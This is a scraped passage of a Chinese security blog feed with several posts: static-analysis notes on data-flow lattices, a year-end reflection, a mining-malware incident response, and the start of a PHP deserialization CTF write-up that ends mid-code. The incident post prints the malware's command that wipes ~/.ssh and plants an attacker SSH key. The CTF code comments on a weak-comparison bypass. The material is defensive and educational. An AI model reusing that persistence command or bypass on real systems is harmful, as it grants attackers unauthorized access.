class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">]</span></span></span></span></span></p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328164133910.png" alt="image-20230328164133910"></p><p>存活表达式分析也可能存在上图的情况，假设我们删去b表达式，当我们在进行存活表达式分析的时候，左侧路径分析x重定义，此时就应该删去，程序最后就是空集和表达式取交集，会得到这个表达式没有存活的结论。</p><p>但如果，左侧路径的x重定义为3，且表达式的x实际上也等于3，执行到程序最后表达式语义是没有问题的，这就会发生误报的现象。</p><h4 id="Algorithm-of-Available-Expressions-Analysis（表达式存活算法）">Algorithm of Available Expressions Analysis（表达式存活算法）</h4><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328164539748.png" alt="image-20230328164539748"></p><p>在程序入口出去的时刻，可以看成程序没执行，自然就是空集。然后对每一个基本块初始化，因为这个分析是Must Analysis，所以初始化为all，就是位向量全置1. 假设初始化不是0，因为后面算法计算是涉及到交集，0和任何数的交集都是0，就没有意义了。</p><p>依旧看一道例题，首先对程序entry的出口初始化为0，其余基本块的输出状态全置1. 将程序中所有表达式提取出来，组成位向量如图所示：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328165245827.png" alt="image-20230328165245827"></p><p>首先分析B1，按照算法，因为B1没有前驱节点，只需要将B1的表达式置1即可，就是<code>OUT[B1] = 10000</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328165426007.png" alt="image-20230328165426007"></p><p>接着分析B2，首先B2的两个前驱节点B1和B4的输出态取交集<code>IN[B2] = OUT[B1] ^ OUT[B4] = 10000</code>，且B2有两个表达式，但<code>e^7 * x</code>和前驱节点B4冲突，所以从<code>IN[B2]</code>中删除掉冲突的表达式（这里已经为0）；此外，这里<strong>p发生了重定义，所以应该删除<code>p-1</code></strong>。然后对应向量位置1：<code>OUT[B2] = 01010 | 00000 = 01010</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328170431715.png" alt="image-20230328170431715"></p><p>下面进入B3，由公式得<code>IN[B3] = OUT[B2] = 01010 </code>，且在B3中存在z的重定义，所以删去<code>z / 5</code>，得到<code>IN[B3] = 00001 | 00010 = 00011 </code> ：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328170702207.png" alt="image-20230328170702207"></p><p>继续到B4，B4的输入<code>IN[B4] = OUT[B2] = 01010</code>，输出<code>OUT[B4] = 00110 | 01010 = 01110</code>:</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328171413174.png" alt="image-20230328171413174"></p><p>最后运行到B5，得到<code>IN[B5] = OUT[B4] ^ OUT[B3] = 01110 ^ 00011 = 00010</code>，在B5中存在两个表达式，而y表达式发生了重定义，故删去<code>2 * y</code>和<code>y + 3</code>，最后得到<code>OUT[B3] = 01010 | 00010 = 01010 </code>:</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328171908296.png" alt="image-20230328171908296"></p><p>第一次迭代结束，因为所有的输出状态值都变化了，所以继续第二次遍历：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs inform7">B1<span class="hljs-comment">[IN]</span> = 00000<br>B1<span class="hljs-comment">[OUT]</span> = 10000<br><br>B2<span class="hljs-comment">[IN]</span> = B1<span class="hljs-comment">[OUT]</span> ^ B4<span class="hljs-comment">[OUT_1]</span> = 10000 ^ 01110 = 00000<br>B2<span class="hljs-comment">[OUT]</span> = 01010<br><br>B3<span class="hljs-comment">[IN]</span> = B2<span class="hljs-comment">[OUT]</span> = 01010<br>B3<span class="hljs-comment">[OUT]</span> = 00011<br><br>B4<span class="hljs-comment">[IN]</span> = B2<span class="hljs-comment">[OUT]</span> = 01010<br>B4<span class="hljs-comment">[OUT]</span> = 01110<br><br>B5<span class="hljs-comment">[IN]</span> = 00010<br>B5<span class="hljs-comment">[OUT]</span> = 01010<br></code></pre></td></tr></table></figure><p>因为输出状态值和第一次一样，所以就不需要第三次遍历了。</p><h4 id="Analysis-Comparision">Analysis Comparision</h4><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available Expressions</th></tr></thead><tbody><tr><td>Domain(集合)</td><td>定义</td><td>变量</td><td>表达式</td></tr><tr><td>Direction</td><td>正向</td><td>反向</td><td>正向</td></tr><tr><td>May/Must</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary(边界)</td><td>OUT[entry]=∅</td><td>IN[exit]=∅</td><td>OUT[entry]=</td></tr><tr><td>Initialization</td><td>OUT[B]=∅</td><td>IN[B]=∅</td><td>OUT[∅]=∪</td></tr><tr><td>Transfer function</td><td>见算法</td><td>见算法</td><td>见算法</td></tr><tr><td>Meet(merge处理)</td><td>∪</td><td>∪</td><td>∩</td></tr></tbody></table><h3 id="Foundations">Foundations</h3><h4 id="Iterative-Algorithm-for-May-Forward-Analysis">Iterative Algorithm for May &amp; Forward Analysis</h4><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328204920975.png" alt="image-20230328204920975"></p><h4 id="View-Iterative-Algorithm-in-Another-Way">View Iterative Algorithm in Another Way</h4><ul><li>Given a CFG(Program) with k nodes, the iterative algorithm updates OUT[n] for every node n in each iteration.<ul><li>假设一个控制流图有k个节点，在每次遍历的时候，我们用OUT[n]表示该点在该次遍历中更新的信息</li></ul></li><li>Assume the domain of the values in data flow analysis is V, then we can define a k-tuple: <code>(OUT[n1], OUT[n2], OUT[n3], ..., OUT[nk])</code>as an element of set(V<sub>1</sub> × V<sub>2</sub> × … × V<sub>k</sub>) denoted as V<sup>k</sup>, to hold the values of the analysis after each iteration.<ul><li>假设在控制流中值域为V，那么我可以定义一个k元组，每个node的状态值将会组成某一次迭代的V<sub>n</sub>，而V<sub>n</sub>作为所有V集合的一个元素。</li></ul></li><li>Each iteration can be considered as taking an action to map an element of V<sup>k</sup> to a new element of V<sup>k</sup>, through applying the transfer functions and control-flow handing, abstracted as a function: <strong>F: V<sup>k</sup> -&gt; V<sup>k</sup></strong><ul><li>这样，每次迭代就可以看成V<sup>k</sup>中的一个元素，通过转换函数或控制流处理，映射到V<sup>k</sup>中的另一个元素。因为存在映射关系，所以就可以抽样成函数的形式。</li></ul></li><li>Then the algorithm outputs a series of k-tuples iteratively until a k-tuple is the same as the last one in two consecutive iterations.<ul><li>之后算法会迭代输出一系列的k元组，直到最后两个连续的k元组的完全相同，迭代才结束。</li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328211616892.png" alt="image-20230328211616892"></p><p>上图用数学语言表示了算法的过程。首先初始化过程，使用bottom符号表示置空，将程序初始化时的值域称为X<sub>0</sub>；在第一次迭代的过程中，v的下标表示节点，上标表示迭代次数，同样将第一次迭代的值域称为X<sub>1</sub>，也就等于F(X<sub>0</sub>)。同样的，直到最后的值域不在发生改变，即X<sub>i</sub>等于X<sub>i+1</sub>，我们可以得到F(X<sub>i</sub>)=X<sub>i</sub>。</p><p>X is a fixed point of function F if <strong>F(x) = x</strong>. 即这个算法达到了不动点（算法可以停止）。</p><p>The iterative algorithm (or the IN/OUT equation system) produces a solution to a data flow analysis:</p><ul><li>Is the algorithm guaranteed to terminate or reach the fixed point, or does it always have a solution?<ul><li>这个算法一定能达到不动点吗？（一定能停止吗？）<ul><li>一定能达到不动点</li></ul></li></ul></li><li>If so, is there only one solution or only one fixed point? If more than one, is our solution the best one(most precise)?<ul><li>假设能达到不动点，那不动点是只有一个吗？那我们求解出来的不动点是最佳答案吗？（是最精确的吗？）</li></ul></li><li>When will the algorithm reach the fixed point, or when can we get the solution?<ul><li>我们什么时候能够到达不动点？</li></ul></li></ul><h4 id="Partial-Order">Partial Order</h4><p>We define <strong>poset（偏序集）</strong> as a pair(P, ≤) where <strong>≤</strong> is a binary relation that defines a partial ordering over P, and ≤ has the following properties:</p><ol><li>自反性（Reflextivity）：对于任意x∈P, x ≤ x</li><li>反对称性（Antisymmetry）：对于任意x, y∈P, x ≤ y ^ y ≤ x -&gt; x = y，x偏序y的同时y也偏序于x，则x和y相等</li><li>传递性（Transitivity）：对于任意x, y, z∈P, x ≤ y ^ y ≤ z -&gt; x ≤ z，x偏序于y，y偏序于y，则x偏序于z</li></ol><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330152641170.png" alt="image-20230330152641170"></p><p>示例，整数集和小于等于关系满足偏序集吗？**答案是满足，回答如上图。**如果改成整数集和小于，那满足偏序集吗？答案是不满足，因为是不满足自反性（1不会小于1）。</p><h4 id="Upper-and-Lower-Bounds（上界和下界）">Upper and Lower Bounds（上界和下界）</h4><p>给定一个偏序集（P，≤）和它一个子集S，并且S也是P的子集。那么，对于任意的x∈S，x都偏序（≤）u，我们就称u∈P是S的一个上界。相近的，如果l∈P是S的下界，那么对于集合S的任意元素x，都存在l偏序于x。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330154216119.png" alt="image-20230330154216119"></p><p>最小上界（least upper bound, lub or join）：对于S的任意一个上界u，都存在最小上界偏序于u。</p><p>最大下界（greatest lower bound, glb or meet）：对于S的任意一个下界l，都存在l偏序于最大下界。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330154817449.png" alt="image-20230330154817449"></p><p>如果集合S里面只有两个元素a和b，那么S的上下界表示如下：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330155353159.png" alt="image-20230330155353159"></p><h5 id="Some-Properties">Some Properties</h5><ol><li>Not every poset has lub or glb，不是所有的偏序集都有最大下界和最小上界</li><li>But if a poset has lub or glb, it will be unique，如果一个偏序集有最大下界或最小上界，那么它有且仅有一个（反对称性可以证明）</li></ol><h4 id="Lattice-格-and-Semilattice">Lattice(格) and Semilattice</h4><p>给定一个偏序集，对于P中的任意a, b两个元素，如果a和b组成的最大下界和最小上界都存在，那么就叫这个偏序集叫做lattice。换句话说，对于lattice里的每一个元素，都有最小上界和最大下界。</p><p>同样的，给定一个偏序集，对于P中任意的元素a和b：如果a和b只能组成最大上界，那么将这个偏序集称为join semilattice; 反之，若只能组成最小下界，那么称为meet semilattice.</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330161637279.png" alt="image-20230330161637279"></p><h4 id="Complete-Lattice">Complete Lattice</h4><p>给定一个格（P，≤），对于P的任意子集S，若S的最小上界和最大下界均存在，那么这个格会被称为全格。也就是说，全格的所有子集，都至少有一个最大下界和最小下界。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330195514261.png" alt="image-20230330195514261"></p><h4 id="Product-Lattice">Product Lattice</h4><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330200044670.png" alt="image-20230330200044670"></p><h4 id="Data-Flow-Analysis-Framework-via-Lattice">Data Flow Analysis Framework via Lattice</h4><p>A data flow analysis framework(D, L, F) consists of:</p><ul><li><strong>Direction</strong>: a direction of data flow: forwards or backwards</li><li><strong>Lattice</strong>: a lattice including domain of the values V and a meet or join operator</li><li><strong>Functions</strong>: a family of transfer functions from V to V</li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330201244805.png" alt="image-20230330201244805"></p><h4 id="Monotonicity-and-Fixed-Point-Theorem">Monotonicity and Fixed-Point Theorem</h4><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230330202137297.png" alt="image-20230330202137297"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的2022年度总结</title>
    <link href="/2023/01/08/%E6%88%91%E7%9A%842022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <url>/2023/01/08/%E6%88%91%E7%9A%842022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="引子">引子</h2><p>时光飞逝，又是一年。以往都是安全团队写个人总结，依稀记得去年开始个人也开始流行写这个东西。其实我之前也是想跟风写个2021年度总结的，主要在那年确实收获了很多，甚至可以说是完成了几个人生上的“成就”。因为那段时间取得的一些成绩我个人当时都没料想到，写出来未免有些夸耀之嫌，干脆就不写了，也不是犯懒。而现在写的这个年度总结，恰恰是感觉今年自己的进步不是很大（至少相比2021年），所以记录下来，予以自勉。</p><h2 id="失去与不足">失去与不足</h2><p>本着先抑后扬的原则，先写写自己过去这一年做的不足吧。</p><p>我最先想到的还是安卓逆向和CTF这两块，本来想的是去年好好搞搞，结果两个都没怎么弄，安卓看了个前面几章，后面也没怎么看；CTF也是下半年的时候打了打，也没一直持续下去。但这两块对我来说是相对重要的。</p><p>对于安卓逆向来说：</p><ul><li>一方面实验室的课题与之有关，虽然我现在精力不是主要放在学术上了，但是我还是需要这块的知识储备的</li><li>安卓逆向的学习也会拓宽漏洞挖掘的宽度，而且现在好多白帽把漏洞挖掘的方向转向了移动应用端的挖掘</li><li>CTF也有安卓逆向相关的题目</li></ul><p>而学CTF的理由更简单粗暴了，就是比赛拿奖找工作，而我现在PHP Web题目都没刷完，之前买了书都没怎么翻……出题方向感觉又有新变动，nodejs方向的代码审计有点多。这是急需加强的一块，不管是比赛还是特招，对于CTF的准备时间真的不多了。</p><p>生活上，主要还是运动方面，在学校还稍微好点，能有朋友带着一起做体育运动；而一回到家或者出去一个人实习的情况下，空闲时间我就不想动了。因为自己本身心率快，年底又查出来高血压，阳过更不能激烈运动，所以就有点尴尬。</p><h2 id="杂记">杂记</h2><p>博客写日常这种行为，写得太多就透露个人的信息太多，作为网安人有点职业上的排斥；要是不写吧，总感觉哪里说不过去的样子。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次挖矿病毒告警的应急响应</title>
    <link href="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <url>/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-事情起因">0x00 事情起因</h2><p>刚开始是实验室里师兄发了一张腾讯云告警的短信：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106141002295.png" alt></p><p>师兄以为是有人在做渗透，大家（包括我）也没当回事：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106141105145.png" alt></p><p>然后第二天又来一条挖矿病毒的告警，发现不大对劲了：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106141147312.png" alt></p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106141219476.png" alt></p><p>腾讯云给挖矿告警了，网上搜了下误报的可能性比较小，不管怎么说先上服务器看看怎么回事吧……</p><h2 id="0x01-初步分析">0x01 初步分析</h2><p>因为事情发生的时候我正好在吃饭，同门先上去看了看，发现了一个奇怪的点：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106141532143.png" alt></p><p>一个账户的.ssh文件夹被人半夜修改过，进去<code>authorized_keys</code>发现被人加了一个私钥：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106141651953.png" alt></p><p>这样一看八成被人搞了，原因如下：</p><ul><li>我查看了服务器时间，发现和中国时间同步，半夜登录是明显的异常行为</li><li>该账户所有者在最近一段时间都没有登录过服务器</li><li>该账户的密码是弱口令，很大程度上存在被爆破的可能</li></ul><p>然后查了下有关该用户的登录日志，发现三个登录成功的异常IP：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106142701067.png" alt></p><p>用微步分别查询了下：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">46.4.71.242</span>------未知IP，但是历史有傀儡机和扫描记录<br><span class="hljs-number">167.99.234.112</span>------恶意IP，存在暴力破解<br><span class="hljs-number">145.239.252.176</span>------未知IP，历史存在撞库记录<br></code></pre></td></tr></table></figure><p>到这里基本上就知道，服务器是弱口令爆破导致的失陷。</p><h2 id="0x02-寻找病毒">0x02 寻找病毒</h2><p>探究清楚了服务器是怎样失陷的，下一步就是揪出挖矿病毒然后把它kill掉。因为考虑到黑客是通过弱口令爆破普通账户A上传的病毒，且root账户密码有一定的强度，黑客应该没有拿到root权限。我初步看了下该用户的home目录，没看到什么很可疑的东西……于是全盘搜索了属于被黑账户用户组的脚本文件<code>find / -user &lt;hacked_account&gt; -name *.sh</code>，发现三个异常文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/.X81z/</span>.rsync<span class="hljs-regexp">/a/</span>tors/cleandirs.sh<br><span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/.X81z/</span>.rsync<span class="hljs-regexp">/a/</span>tors/stop.sh<br><span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/.X81z/</span>.rsync<span class="hljs-regexp">/a/</span>tors/start.sh<br></code></pre></td></tr></table></figure><p>记得rsync是linux备份数据相关的东西，但是服务器上应该没有人用过，看了看sh也没找到外连的ip和域名信息……</p><p>所以这里就<code>ps -ef | grep &lt;hacked_account&gt;</code>查看被黑用户所产生的进程，发现了一个奇怪的东西：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106144614937.png" alt></p><p>刚好在告警日期运行的该进程，百度搜了下发现真是挖矿病毒：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106144714866.png" alt></p><p>home目录没有这个东西，直接<code>find / -name kswapd0</code>看看在哪里，发现就在<code>/var/tmp/.X81z/.rsync/a/</code>这个目录——就是上面找到三个异常脚本文件的目录，看来是黑客利用rsync试图隐藏病毒。同时在<code>.X81z</code>文件夹下发现了<code>dota3.tar.gz</code>压缩文件，就是黑客所上传的压缩包：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106145133647.png" alt></p><h2 id="0x03-脚本分析">0x03 脚本分析</h2><p>怎么知道病毒在服务器上究竟干了什么？我用了微步的在线云沙箱分析了<code>dota3.tar.gz</code>。</p><p>首先运行<code>kswapd0</code>后，程序会在当前用户的<code>.ssh</code>文件夹下写入私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh -c <span class="hljs-built_in">cd</span> ~ &amp;&amp; <span class="hljs-built_in">rm</span> -rf .ssh &amp;&amp; <span class="hljs-built_in">mkdir</span> .ssh &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&quot;</span>&gt;&gt;.ssh/authorized_keys &amp;&amp; <span class="hljs-built_in">chmod</span> -R go= ~/.ssh &amp;&amp; <span class="hljs-built_in">cd</span> ~<br></code></pre></td></tr></table></figure><p>然后就是简单粗暴的挖矿：</p><p><img src="/2023/01/06/%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%91%8A%E8%AD%A6%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20230106150057169.png" alt></p><h2 id="0x04-打扫战场">0x04 打扫战场</h2><p>因为失陷用户已经不用了，所以直接pkill掉失陷用户的所有进程，然后<code>userdel -r &lt;hacked_account&gt;</code>删掉账户。最后删除<code>/var/tmp/.X81z/</code>挖矿病毒所属的文件夹，顺便把压缩包下载保存样本，并告知所有人更换更高强度的密码。</p><h2 id="0x05-总结">0x05 总结</h2><p>关于此次事件的发生与应急响应，总结如下：</p><ul><li>无论什么时候都不要使用弱口令</li><li>长时间不用的闲置用户需要定时删除</li><li>应急响应时仔细查看进程，检查服务，存在异常的文件夹更应该仔细检查</li><li>云服务商的告警信息也需要注意</li></ul><p>另注：本文首发于土司</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>蓝队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
      <tag>Powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯2020青龙组_AreUSerialz</title>
    <link href="/2022/10/23/AreUSerialz/"/>
    <url>/2022/10/23/AreUSerialz/</url>
    
    <content type="html"><![CDATA[<h1>[网鼎杯 2020 青龙组]AreUSerialz</h1><h2 id="0x00-过程">0x00 过程</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">//初始化执行</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<span class="hljs-comment">//弱比较，此时op设置i:2或s:2&quot; a&quot;都可绕过</span><br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <br>    <span 